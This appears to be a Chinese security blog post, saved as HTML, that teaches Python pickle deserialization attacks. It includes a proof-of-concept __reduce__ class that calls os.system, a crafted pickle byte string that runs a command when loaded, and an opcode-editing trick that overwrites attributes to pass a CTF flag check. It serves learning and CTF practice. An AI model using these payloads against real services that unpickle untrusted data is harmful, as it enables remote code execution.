@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言与php不同的是，python作为脚本语言通过import导入模块(包含类)，相比PHP只能利用代码中存在的类和内置类，python反序列化就更加灵活了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python反序列化">
+<meta property="og:url" content="https://mayylu.github.io/2023/05/18/python/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言与php不同的是，python作为脚本语言通过import导入模块(包含类)，相比PHP只能利用代码中存在的类和内置类，python反序列化就更加灵活了">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-05-18T06:04:19.000Z">
+<meta property="article:modified_time" content="2023-06-13T13:06:42.348Z">
+<meta property="article:author" content="mayylu">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2023/05/18/python/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2023/05/18/python/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2023/05/18/python/python反序列化/","title":"python反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>python反序列化 | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pickle%E6%A8%A1%E5%9D%97"><span class="nav-number">2.</span> <span class="nav-text">Pickle模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">基础使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pickletools%E8%B0%83%E8%AF%95%E5%99%A8"><span class="nav-number">2.2.</span> <span class="nav-text">pickletools调试器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reduce-%E4%B8%87%E6%81%B6%E4%B9%8B%E6%BA%90"><span class="nav-number">2.3.</span> <span class="nav-text">__reduce__ 万恶之源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c%E6%8C%87%E4%BB%A4%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-number">2.4.</span> <span class="nav-text">c指令实现变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUILD%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">BUILD指令绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">2.6.</span> <span class="nav-text">绕过函数黑名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">2.6.1.</span> <span class="nav-text">黑名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iscc2023-ISCC%E5%86%85%E9%83%A8%E9%9B%B6%E5%85%83%E8%B4%AD-2"><span class="nav-number">2.6.2.</span> <span class="nav-text">iscc2023 ISCC内部零元购-2</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">关注生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2023/05/18/python/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="关注生活的点点滴滴">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          python反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-18 14:04:19" itemprop="dateCreated datePublished" datetime="2023-05-18T14:04:19+08:00">2023-05-18</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2023-06-13 21:06:42" itemprop="dateModified" datetime="2023-06-13T21:06:42+08:00">2023-06-13</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>与php不同的是，python作为脚本语言通过import导入模块(包含类)，相比PHP只能利用代码中存在的类和内置类，python反序列化就更加灵活了</p>
+<span id="more"></span>
+<h2 id="Pickle模块"><a href="#Pickle模块" class="headerlink" title="Pickle模块"></a>Pickle模块</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>一、dump()方法序列化</p>
+<p><code>pickle.dump(obj, file, [,protocol])</code></p>
+<p>注释：序列化对象，将对象obj保存到文件file中去。<br>file表示保存到的类文件对象，file必须有write()接口，file可以是一个以’w’打开的文件或者是一个StringIO对象，也可以是任何可以实现write()接口的对象。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="comment"># 定义一个简单的 Python 对象</span></span><br><span class="line">data = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># 序列化该对象为字节流</span></span><br><span class="line">files = StringIO()</span><br><span class="line">pickler = pickle.Pickler(files)</span><br><span class="line">pickler.dump(data)</span><br><span class="line">strs = files.getvalue()</span><br><span class="line"><span class="comment"># 反序列化字节流为 Python 对象</span></span><br><span class="line">files = StringIO(strs)</span><br><span class="line">unpkler = pickle.Unpickler(files)</span><br><span class="line">new_data = unpkler.load()</span><br><span class="line"><span class="comment"># 输出反序列化后的对象</span></span><br><span class="line"><span class="built_in">print</span>(new_data)  <span class="comment"># &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>
+<p>参数protocol是序列化模式<br>protocol的值还可以是1和2（1和2表示以二进制的形式进行序列化。其中，1是老式的二进制协议；2是新二进制协议）。<br>v3版协议添加于Python 3.0,它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。<br>v4版协议添加于Python 3.4, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅PEP 3154.<br>v5版协议添加于Python 3.8, 它支持带外数据, 加速带内数据处理.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;mayylu&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Helloworld&quot;</span>)</span><br><span class="line">a=People()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(pickle.dumps(a,protocol=<span class="number">4</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nPeople\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVmayylu\np7\nsb.&#x27;</span><br><span class="line">b&#x27;ccopy_reg\n_reconstructor\nq\x00(c__main__\nPeople\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\&#125;q\x05X\x04\x00\x00\x00nameq\x06X\x06\x00\x00\x00mayyluq\x07sb.&#x27;</span><br><span class="line">b&#x27;\x80\x02c__main__\nPeople\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00mayyluq\x04sb.&#x27;</span><br><span class="line">b&#x27;\x80\x03c__main__\nPeople\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00mayyluq\x04sb.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x06mayylu\x94sb.&#x27;</span><br><span class="line">b&#x27;\x80\x05\x95.\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06People\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x06mayylu\x94sb.&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<p>二、load()方法反序列化</p>
+<p><code>pickle.load(file)</code></p>
+<p>注释：反序列化对象，将文件中的数据解析为一个python对象。file中有read()接口和readline()接口</p>
+<p>三、loads()和dumps()<br><code>data_dumps =pickle.dumps(obj,[,protocol])</code>将对象obj对象序列化并返回一个byte对象<br><code>data=pickle.loads(data_dumps )</code>从字节对象中读取被封装的对象，并返回</p>
+<p>不需要文件流</p>
+<h3 id="pickletools调试器"><a href="#pickletools调试器" class="headerlink" title="pickletools调试器"></a>pickletools调试器</h3><p>以下对<strong>v3协议</strong>进行简单的分析</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dairy</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.value1 = <span class="string">&#x27;hh&#x27;</span></span><br><span class="line">        self.value2 = <span class="number">123</span></span><br><span class="line">  </span><br><span class="line">user = dairy()</span><br><span class="line">y = pickle.dumps(user,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">pickletools.dis(y)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x06\x00\x00\x00value1q\x03X\x02\x00\x00\x00hhq\x04X\x06\x00\x00\x00value2q\x05K&#123;ub.&#x27;</span><br><span class="line"></span><br><span class="line">    0: \x80 PROTO      3                    //版本说明</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ dairy&#x27;     //c连续读取两个字符串，module和name，以\n分隔，一块压进栈</span><br><span class="line">   18: q    BINPUT     0                    //当前栈栈顶复制一份到储存区</span><br><span class="line">   20: )    EMPTY_TUPLE                     //把一个空的tuple压入当前栈(即参数args)</span><br><span class="line">   21: \x81 NEWOBJ                          //从栈中弹出一个args和一个class，然后利用这个args实例化class，把得到的instance压进栈</span><br><span class="line">   22: q    BINPUT     1</span><br><span class="line">   24: &#125;    EMPTY_DICT                      //把一个空的dict压进栈</span><br><span class="line">   25: q    BINPUT     2</span><br><span class="line">   27: (    MARK                            //(标记</span><br><span class="line">   28: X        BINUNICODE &#x27;value1&#x27;         //BINUNICODE在序列化时会将Unicode字符串转换为UTF-8编码的字节串,标志符位X,并再其后加上一个字节数前缀表示字节串长度,</span><br><span class="line">   39: q        BINPUT     3</span><br><span class="line">   41: X        BINUNICODE &#x27;hh&#x27;</span><br><span class="line">   48: q        BINPUT     4                //无关紧要,通过用pickletools.optimize函数处理后，会被省略但并不影响反序列化</span><br><span class="line">   50: X        BINUNICODE &#x27;value2&#x27;</span><br><span class="line">   61: q        BINPUT     5</span><br><span class="line">   63: K        BININT1    123</span><br><span class="line">   65: u        SETITEMS   (MARK at 27)     //将任意数量的键值对添加到现有字典中</span><br><span class="line">   66: b    BUILD</span><br><span class="line">   67: .                                    //.点号是结束符</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<h3 id="reduce-万恶之源"><a href="#reduce-万恶之源" class="headerlink" title="__reduce__ 万恶之源"></a><code>__reduce__</code> 万恶之源</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dairy</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span><span class="comment">#加不加无所谓</span></span><br><span class="line">        self.value1 = <span class="string">&#x27;hh&#x27;</span></span><br><span class="line">        self.value2 = <span class="string">&#x27;xx&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;dir&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,)) <span class="comment"># __reduce__ must return a string or tuple</span></span><br><span class="line">user = dairy()</span><br><span class="line">y = pickle.dumps(user,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">pickletools.dis(y)</span><br></pre></td></tr></table></figure>
+<p>发现会生成完全不一样的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03cnt\nsystem\nq\x00X\x03\x00\x00\x00dirq\x01\x85q\x02Rq\x03.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;nt system&#x27;  //c连续读取两个字符串，一块压进栈</span><br><span class="line">   13: q    BINPUT     0</span><br><span class="line">   15: X    BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   23: q    BINPUT     1</span><br><span class="line">   25: \x85 TUPLE1</span><br><span class="line">   26: q    BINPUT     2</span><br><span class="line">   28: R    REDUCE</span><br><span class="line">   29: q    BINPUT     3</span><br><span class="line">   31: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<p>将上面生成的结果反序列化，即使没有__reduce__方法也可以执行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mayylu</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.value1 = <span class="string">&#x27;hh&#x27;</span></span><br><span class="line">        self.value2 = <span class="string">&#x27;xx&#x27;</span></span><br><span class="line">   </span><br><span class="line">y = pickle.loads(<span class="string">b&#x27;\x80\x03cnt\nsystem\nq\x00X\x03\x00\x00\x00dirq\x01\x85q\x02Rq\x03.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如何过滤掉reduce呢？由于__reduce__方法对应的操作码是R，只需要把操作码R过滤掉就行了。这个可以很方便地利用<strong>pickletools.genops</strong>来实现。</p>
+<h3 id="c指令实现变量覆盖"><a href="#c指令实现变量覆盖" class="headerlink" title="c指令实现变量覆盖"></a>c指令实现变量覆盖</h3><p>c指令后面跟的是模块名和类名,可以利用c指令调用任意值</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools</span><br><span class="line"><span class="keyword">import</span> mabaoguo <span class="comment">#未知</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Member</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.name = <span class="string">&quot;mabaoguo&quot;</span></span><br><span class="line">        self.random = <span class="string">&#x27;fbiylxuoktjpesc&#x27;</span></span><br><span class="line">        self.gongfu = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"></span><br><span class="line">result = pickle.loads(result)</span><br><span class="line">    <span class="keyword">if</span> result.name == <span class="string">&#x27;mabaoguo&#x27;</span> <span class="keyword">and</span> result.random == mabaoguo.random <span class="keyword">and</span> result.gongfu == mabaoguo.gongfu:</span><br><span class="line">        <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">修改前：</span><br><span class="line">\x80\x03c__main__\nMember\n)\x81&#125;(X\x04\x00\x00\x00name</span><br><span class="line">X\x08\x00\x00\x00mabaoguo</span><br><span class="line">X\x06\x00\x00\x00random</span><br><span class="line">X\x0f\x00\x00\x00fbiylxuoktjpesc</span><br><span class="line">X\x06\x00\x00\x00gongfu</span><br><span class="line">X\x03\x00\x00\x00123ub.</span><br><span class="line"></span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ Member&#x27;</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   32: X        BINUNICODE &#x27;mabaoguo&#x27;</span><br><span class="line">   45: X        BINUNICODE &#x27;random&#x27;</span><br><span class="line">   56: X        BINUNICODE &#x27;fbiylxuoktjpesc&#x27;</span><br><span class="line">   76: X        BINUNICODE &#x27;gongfu&#x27;</span><br><span class="line">   87: X        BINUNICODE &#x27;123&#x27;</span><br><span class="line">   95: u        SETITEMS   (MARK at 22)</span><br><span class="line">   96: b    BUILD</span><br><span class="line">   97: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">修改后：</span><br><span class="line">\x80\x03c__main__\nMember\n)\x81&#125;(X\x04\x00\x00\x00name</span><br><span class="line">X\x08\x00\x00\x00mabaoguo</span><br><span class="line">X\x06\x00\x00\x00random</span><br><span class="line">cmabaoguo\nrandom\n</span><br><span class="line">X\x06\x00\x00\x00gongfu</span><br><span class="line">cmabaoguo\ngongfu\nub.</span><br><span class="line"></span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ Member&#x27;</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   32: X        BINUNICODE &#x27;mabaoguo&#x27;</span><br><span class="line">   45: X        BINUNICODE &#x27;random&#x27;</span><br><span class="line">   56: c        GLOBAL     &#x27;mabaoguo random&#x27;</span><br><span class="line">   73: X        BINUNICODE &#x27;gongfu&#x27;</span><br><span class="line">   84: c        GLOBAL     &#x27;mabaoguo gongfu&#x27;</span><br><span class="line">  101: u        SETITEMS   (MARK at 22)</span><br><span class="line">  102: b    BUILD</span><br><span class="line">  103: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
